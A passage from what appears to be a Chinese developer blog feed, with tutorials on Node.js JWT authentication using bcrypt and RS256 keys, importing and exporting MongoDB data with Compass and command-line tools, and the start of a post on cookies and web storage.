number)</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> UserSchema = <span class="keyword">new</span> mongoose.Schema(&#123;</span><br><span class="line">  username: &#123;</span><br><span class="line">    type: <span class="built_in">String</span>,</span><br><span class="line">    unique: <span class="literal">true</span> <span class="comment">//唯一值</span></span><br><span class="line">  &#125;,</span><br><span class="line">  password: &#123;</span><br><span class="line">    type: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">set</span>: (val) =&gt; &#123;</span><br><span class="line">      <span class="keyword">return</span> bcrypt.hashSync(val, <span class="number">10</span>) <span class="comment">//加密</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>User完整代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">'mongoose'</span>);</span><br><span class="line"><span class="keyword">const</span> bcrypt = <span class="built_in">require</span>(<span class="string">'bcrypt'</span>)</span><br><span class="line"></span><br><span class="line">mongoose.connect(<span class="string">'mongodb://localhost:27017/test-token'</span>, &#123;</span><br><span class="line">  useNewUrlParser: <span class="literal">true</span>,</span><br><span class="line">  useCreateIndex: <span class="literal">true</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> UserSchema = <span class="keyword">new</span> mongoose.Schema(&#123;</span><br><span class="line">  username: &#123;</span><br><span class="line">    type: <span class="built_in">String</span>,</span><br><span class="line">    unique: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  password: &#123;</span><br><span class="line">    type: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">set</span>: (val) =&gt; &#123;</span><br><span class="line">      <span class="keyword">return</span> bcrypt.hashSync(val, <span class="number">10</span>) <span class="comment">//加密</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = mongoose.model(<span class="string">'User'</span>, UserSchema)</span><br></pre></td></tr></table></figure></li><li><p>处理用户注册</p><ol><li>判断当前用户是否已被注册：<code>User.find({ username: req.body.username,})</code></li><li>写入数据库：<code>User.create({username: req.body.username,password: req.body.password,})</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">'/register'</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// console.log(req.body);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> users = <span class="keyword">await</span> User.find(&#123;</span><br><span class="line">    username: req.body.username,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">if</span> (users.length != <span class="number">0</span>) <span class="keyword">return</span> res.end(<span class="string">'该用户已注册'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> User.create(&#123;</span><br><span class="line">    username: req.body.username,</span><br><span class="line">    password: req.body.password,</span><br><span class="line">  &#125;);</span><br><span class="line">  res.end(<span class="string">'注册成功'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>处理用户登录</p><ol><li>判断数据库是否有当前用户：<code>User.findOne({ username: body.username })</code></li><li>判断密码是否正确：<code>bcrypt.compareSync(body.password, user.password);</code></li><li>生成token：<code>jwt.sign({id}, SECRET, {options})</code><ul><li>定义SECRET：<code>let SECRET = &#39;自定义密钥内容&#39;;</code></li></ul></li><li>发送token</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> SECRET = <span class="string">'自定义密钥内容'</span>;</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/login'</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> body = req.body;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//1.判断用户是否存在</span></span><br><span class="line">  <span class="keyword">let</span> user = <span class="keyword">await</span> User.findOne(&#123; <span class="attr">username</span>: body.username &#125;);</span><br><span class="line">  <span class="keyword">if</span> (!user) <span class="keyword">return</span> res.status(<span class="number">422</span>).json(&#123; <span class="attr">errorCode</span>: <span class="number">1</span>, <span class="attr">message</span>: <span class="string">'用户不存在'</span> &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用户存在</span></span><br><span class="line">  <span class="comment">// 2.密码校验</span></span><br><span class="line">  <span class="keyword">let</span> isPasswordValid = bcrypt.compareSync(body.password, user.password);</span><br><span class="line">  <span class="keyword">if</span> (!isPasswordValid) <span class="keyword">return</span> res.status(<span class="number">422</span>).json(&#123; <span class="attr">errorCode</span>: <span class="number">2</span>, <span class="attr">message</span>: <span class="string">'密码错误'</span> &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3.生成token</span></span><br><span class="line">  <span class="keyword">let</span> token = jwt.sign(</span><br><span class="line">    &#123; <span class="attr">id</span>: <span class="built_in">String</span>(user.id) &#125;, <span class="comment">//密码不要放进来，放一个唯一的东西就可以了</span></span><br><span class="line">    SECRET, <span class="comment">//密钥</span></span><br><span class="line">    &#123;</span><br><span class="line">      expiresIn: <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>, <span class="comment">//24h后失效</span></span><br><span class="line">    &#125; <span class="comment">//配置项</span></span><br><span class="line">  );</span><br><span class="line">  res.send(token);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>处理用户验证</p><ol><li>获取token：<code>req.headers.authorization</code></li><li>解析token：<code>jwt.verify(raw, SECRET)</code></li><li>查找用户：<code>User.findById(id)</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/profile'</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 获取token</span></span><br><span class="line">  <span class="keyword">let</span> raw = <span class="built_in">String</span>(req.headers.authorization).split(<span class="string">' '</span>)[<span class="number">1</span>];</span><br><span class="line">  <span class="comment">// 解析token并获取id</span></span><br><span class="line">  <span class="keyword">let</span> id = jwt.verify(raw, SECRET).id;</span><br><span class="line">  <span class="comment">// 查找用户</span></span><br><span class="line">  <span class="keyword">let</span> user = <span class="keyword">await</span> User.findById(id);</span><br><span class="line">  res.send(user);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>将token验证过程拆解成中间件，并进行验证</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 中间件</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 获取token</span></span><br><span class="line">  <span class="keyword">let</span> raw = <span class="built_in">String</span>(req.headers.authorization).split(<span class="string">' '</span>)[<span class="number">1</span>];</span><br><span class="line">  <span class="comment">// 解析token并获取id</span></span><br><span class="line">  <span class="keyword">let</span> id = jwt.verify(raw, SECRET).id;</span><br><span class="line">  <span class="comment">// 查找用户</span></span><br><span class="line">  req.user = <span class="keyword">await</span> User.findById(id);</span><br><span class="line">  next();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/market'</span>, auth, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">  res.send(req.user);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bcrypt = <span class="built_in">require</span>(<span class="string">'bcrypt'</span>); <span class="comment">//加密</span></span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">'jsonwebtoken'</span>); <span class="comment">//token</span></span><br><span class="line"><span class="keyword">const</span> User = <span class="built_in">require</span>(<span class="string">'./User.js'</span>); <span class="comment">//用户模块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="comment">// 定义密钥，也可通过openssl进行私钥公钥配对</span></span><br><span class="line"><span class="keyword">let</span> SECRET = <span class="string">'dongyuan666'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收前端传递的json数据</span></span><br><span class="line">app.use(express.json());</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(req.query);</span><br><span class="line">  res.send(<span class="string">'Ok'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/register'</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// console.log(req.body);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> users = <span class="keyword">await</span> User.find(&#123;</span><br><span class="line">    username: req.body.username,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">if</span> (users.length != <span class="number">0</span>) <span class="keyword">return</span> res.end(<span class="string">'该用户已注册'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> User.create(&#123;</span><br><span class="line">    username: req.body.username,</span><br><span class="line">    password: req.body.password,</span><br><span class="line">  &#125;);</span><br><span class="line">  res.end(<span class="string">'注册成功'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/login'</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> body = req.body;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//1.判断用户是否存在</span></span><br><span class="line">  <span class="keyword">let</span> user = <span class="keyword">await</span> User.findOne(&#123; <span class="attr">username</span>: body.username &#125;);</span><br><span class="line">  <span class="keyword">if</span> (!user) <span class="keyword">return</span> res.status(<span class="number">422</span>).json(&#123; <span class="attr">errorCode</span>: <span class="number">1</span>, <span class="attr">message</span>: <span class="string">'用户不存在'</span> &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用户存在</span></span><br><span class="line">  <span class="comment">// 2.密码校验</span></span><br><span class="line">  <span class="keyword">let</span> isPasswordValid = bcrypt.compareSync(body.password, user.password);</span><br><span class="line">  <span class="keyword">if</span> (!isPasswordValid) <span class="keyword">return</span> res.status(<span class="number">422</span>).json(&#123; <span class="attr">errorCode</span>: <span class="number">2</span>, <span class="attr">message</span>: <span class="string">'密码错误'</span> &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3.生成token</span></span><br><span class="line">  <span class="keyword">let</span> token = jwt.sign(</span><br><span class="line">    &#123; <span class="attr">id</span>: <span class="built_in">String</span>(user.id) &#125;, <span class="comment">//密码不要放进来，放一个唯一的东西就可以了</span></span><br><span class="line">    SECRET, <span class="comment">//密钥</span></span><br><span class="line">    &#123;</span><br><span class="line">      expiresIn: <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>, <span class="comment">//24h后失效</span></span><br><span class="line">    &#125; <span class="comment">//配置项</span></span><br><span class="line">  );</span><br><span class="line">  res.send(token);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/profile'</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// return res.send(String(req.headers.authorization).split(' '))</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">let</span> raw = <span class="built_in">String</span>(req.headers.authorization).split(<span class="string">' '</span>)[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">let</span> id = jwt.verify(raw, SECRET).id;</span><br><span class="line">  <span class="keyword">let</span> user = <span class="keyword">await</span> User.findById(id);</span><br><span class="line">  res.send(user);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中间件</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 获取token</span></span><br><span class="line">  <span class="keyword">let</span> raw = <span class="built_in">String</span>(req.headers.authorization).split(<span class="string">' '</span>)[<span class="number">1</span>];</span><br><span class="line">  <span class="comment">// 解析token并获取id</span></span><br><span class="line">  <span class="keyword">let</span> id = jwt.verify(raw, SECRET).id;</span><br><span class="line">  <span class="comment">// 查找用户</span></span><br><span class="line">  req.user = <span class="keyword">await</span> User.findById(id);</span><br><span class="line">  next();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/market'</span>, auth, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">  res.send(req.user);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'server is running'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="🔺非对称加密"><a href="#🔺非对称加密" class="headerlink" title="🔺非对称加密"></a>🔺非对称加密</h3><p><a href="https://juejin.cn/post/7062173044214595597#heading-9" target="_blank" rel="noopener">在Node.Js中使用JWT实现Token用户验证🔺🔺🔺</a> or <a href="https://www.jianshu.com/p/48462fb34a8a" target="_blank" rel="noopener">node token验证</a></p><blockquote><p>非对称加密：RS256</p><p>私钥（private key）：用于发布令牌</p><p>公钥（public key）：用于验证令牌</p></blockquote><p>非对称加密步骤</p><ol><li><p>使用openssl生成公钥私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl</span><br><span class="line">OpenSSL&gt; genrsa -out private.key 1024</span><br><span class="line">OpenSSL&gt; rsa -<span class="keyword">in</span> private.key -pubout -out public.key</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2022/04/15/node-token%E7%99%BB%E9%99%86%E6%B3%A8%E5%86%8C%E9%AA%8C%E8%AF%81/image-20220328102415279.png" alt="image-20220328102415279"></p></li><li><p>新建一个文件用于读取密钥并导出（config.js）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PRIVATE_KEY = fs.readFileSync(path.resolve(__dirname, <span class="string">'./keys/private.key'</span>));</span><br><span class="line"><span class="keyword">const</span> PUBLIC_KEY = fs.readFileSync(path.resolve(__dirname, <span class="string">'./keys/public.key'</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports.PRIVATE_KEY = PRIVATE_KEY;</span><br><span class="line"><span class="built_in">module</span>.exports.PUBLIC_KEY = PUBLIC_KEY;</span><br></pre></td></tr></table></figure></li><li><p>导入密钥（app.js）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; PRIVATE_KEY, PUBLIC_KEY &#125; = <span class="built_in">require</span>(<span class="string">'./config.js'</span>);</span><br></pre></td></tr></table></figure></li><li><p>使用私钥进行加密</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> token = jwt.sign(</span><br><span class="line">    &#123; <span class="attr">id</span>: <span class="built_in">String</span>(user.id) &#125;, <span class="comment">//密码不要放进来，放一个唯一的东西就可以了</span></span><br><span class="line">    PRIVATE_KEY, <span class="comment">//私钥加密</span></span><br><span class="line">    &#123;</span><br><span class="line">      expiresIn: <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>, <span class="comment">//24h后失效</span></span><br><span class="line">      algorithm: <span class="string">'RS256'</span>, <span class="comment">//非对称加密</span></span><br><span class="line">    &#125; <span class="comment">//配置项</span></span><br><span class="line">  );</span><br></pre></td></tr></table></figure></li><li><p>使用公钥进行解密</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt.verify(raw, PUBLIC_KEY, &#123; <span class="attr">algorithms</span>: [<span class="string">'RS256'</span>] &#125;)</span><br></pre></td></tr></table></figure></li></ol><h2 id="Token安全之道"><a href="#Token安全之道" class="headerlink" title="Token安全之道"></a>Token安全之道</h2><p>建议阅读：<a href="https://segmentfault.com/q/1010000021515464" target="_blank" rel="noopener">token拷贝到别人电脑上，禁止授权</a>🔺</p><p>简短：</p><ol><li><a href="http://www.sankedan.com/detail/9/2463.html" target="_blank" rel="noopener">关于 token 被盗取的问题</a></li><li><a href="https://blog.csdn.net/weixin_43644324/article/details/87895729" target="_blank" rel="noopener">如果一个用户的 token 被其他用户劫持了，怎样解决这个安全问题</a></li></ol><p>实践：<a href="https://juejin.cn/post/6844903498329358349" target="_blank" rel="noopener">注册、登录和 token 的安全之道</a></p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB数据入库</title>
      <link href="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/"/>
      <url>/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="数据入库方式"><a href="#数据入库方式" class="headerlink" title="数据入库方式"></a>数据入库方式</h2><p>打开MongoDB Compass（<a href="https://www.mongodb.com/try/download/compass" target="_blank" rel="noopener">点击此处下载官方安装包</a>）</p><p>下载完解压即可使用</p><p><img src= "/img/loading.gif" data-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211162053358.png" alt="image-20220211162053358"></p><p>连接数据库，默认一般是这个地址</p><p><img src= "/img/loading.gif" data-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211162138766.png" alt="image-20220211162138766"></p><p>接着选择你要导入的数据库数据集位置，然后点击ADD DATA→Import file 选项进行数据导入</p><p><img src= "/img/loading.gif" data-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211162802872.png" alt="image-20220211162802872"></p><p>然后就可以根据两种不同的数据源格式方式进行导入</p><h3 id="CSV格式导入"><a href="#CSV格式导入" class="headerlink" title="CSV格式导入"></a>CSV格式导入</h3><ol><li><p>选择完csv格式的数据后，在下面的Ignore empty strings选项中根据自己需求进行选择，打勾则是会将空数据忽略，取消勾选则会保留空数据</p></li><li><p>接着在下面的字段名中选择当前字段所属的类型，最好一一确定每个字段类型并选择好，避免后面因数据类型而引起的其他开发问题</p></li><li><p>确定好之后点击INPORT选项即可导入数据了</p><p><img src= "/img/loading.gif" data-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211163028242.png" alt="image-20220211163028242"></p></li><li><p>导入成功</p><p><img src= "/img/loading.gif" data-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211163445590.png" alt="image-20220211163445590"></p></li><li><p>最后提醒，一般现在的excel保存后的数据都是xlsx格式的文件类型，这样的文件类型导入后只会出现一堆乱码，所以记得在excel另存为csv类型的文件</p><p><img src= "/img/loading.gif" data-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211163807052.png" alt="image-20220211163807052"></p></li></ol><h3 id="JSON格式导入"><a href="#JSON格式导入" class="headerlink" title="JSON格式导入"></a>JSON格式导入</h3><ol><li><p>JSON数据比前面的csv数据好导，选择完文件即可导入了，so easy</p><p><img src= "/img/loading.gif" data-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211163958511.png" alt="image-20220211163958511"></p></li></ol><h2 id="出库方式"><a href="#出库方式" class="headerlink" title="出库方式"></a>出库方式</h2><p>出库方式非常简单，摸索摸索就出来了</p><p>通过下面的小按钮，然后可以选择根据查询条件导出，也可以选择全部导出，然后点击SELECT FIELDS，选择完想要导出的字段即可导出啦</p><p><img src= "/img/loading.gif" data-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211164313741.png" alt="image-20220211164313741"></p><h2 id="控制台导出导入方式（cmd）"><a href="#控制台导出导入方式（cmd）" class="headerlink" title="控制台导出导入方式（cmd）"></a>控制台导出导入方式（cmd）</h2><ol><li><p><strong>导入</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongoimport -d 数据库名 -c 数据集名 --type 数据类型 --headerline --file 文件名（记得加后缀）</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">实例</span><br><span class="line">mongoimport <span class="literal">-d</span> MZedu <span class="literal">-c</span> MiddleSchool -<span class="literal">-type</span> csv -<span class="literal">-headerline</span> -<span class="operator">-file</span> 梅城中学.csv</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p><strong>导出</strong></p><ol><li><p>管理员身份运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongodump -h 127.0.0.1 -d 数据库名 -o 保存路径</span><br></pre></td></tr></table></figure></li></ol></li></ol><ol start="2"><li><p>导出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongoexport -d 数据库名 -c collections的名字 -o filename.json/filename.csv  -f field</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>参数说明：</p><ol><li>-d   数据库名(database)</li><li>-c   collections名</li><li>-o   要存入的文件名(xxx.json/xxx.csv)</li><li>-f   输出特定属性列(一般情况下可以不加这个参数)</li></ol></blockquote><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><blockquote><p>MongoDB最新版（5.0）bin文件夹里面已经没有这两个导出程序了，所以上面的几个命令无法在5.0执行，但在4.2版本，自己试了试是可以的</p></blockquote><p><img src= "/img/loading.gif" data-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211170735586.png" alt="4.2"></p><p>对比可以看到，5.0已经没有该导入导出程序了</p><p><img src= "/img/loading.gif" data-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211170800643.png" alt="image-20220211170800643"></p>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web存储</title>
      <link href="/2022/04/10/web%E5%AD%98%E5%82%A8/"/>
      <url>/2022/04/10/web%E5%AD%98%E5%82%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Web存储"><a href="#Web存储" class="headerlink" title="Web存储"></a>Web存储</h1><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies" target="_blank" rel="noopener">HTTP cookies - HTTP | MDN (mozilla.org)</a></p><p>cookie 机制的使得服务器无法确认 cookie 是在安全来源上设置的，甚至无法确定 cookie 最初是在哪里设置的</p><blockquote><p>🔺信息被存在 Cookie 中时，需要明白 cookie 的值时可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。</p><p>当机器处于不安全环境时，切记<em>不能</em>通过 HTTP Cookie 存储、传输敏感信息。</p></blockquote><p>客户端（浏览器端）可以修改cookie（所以某种意义上来讲它是不安全的，客户端可以随意修改或获取cookie的内容）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">documont.cookie <span class="comment">//获取</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">'abcdefg'</span><span class="comment">//赋值</span></span><br></pre></td></tr></table></figure><p><strong>Cookie指某些网站为了辨别用户身份而储存在用户本地终端上的数据(通常经过加密)。 cookie是服务端生成，客户端进行维护和存储</strong>。通过cookie,可以让服务器知道请求是来源哪个客户端，就可以进行客户端状态的维护，比如登陆后刷新，请求头就会携带登陆时response header中的set-cookie,Web服务器接到请求时也能读出cookie的值，根据cookie值的内容就可以判断和恢复一些用户的信息状态。推荐阅读：<a href="https://juejin.cn/post/6844903812092674061" target="_blank" rel="noopener">深入了解浏览器存储–从cookie到WebStorage、IndexedDB</a></p><h2 id="SessionStorage"><a href="#SessionStorage" class="headerlink" title="SessionStorage"></a>SessionStorage</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage" target="_blank" rel="noopener">Window.sessionStorage - Web API 接口参考 | MDN (mozilla.org)</a></p><p><code>sessionStorage</code> 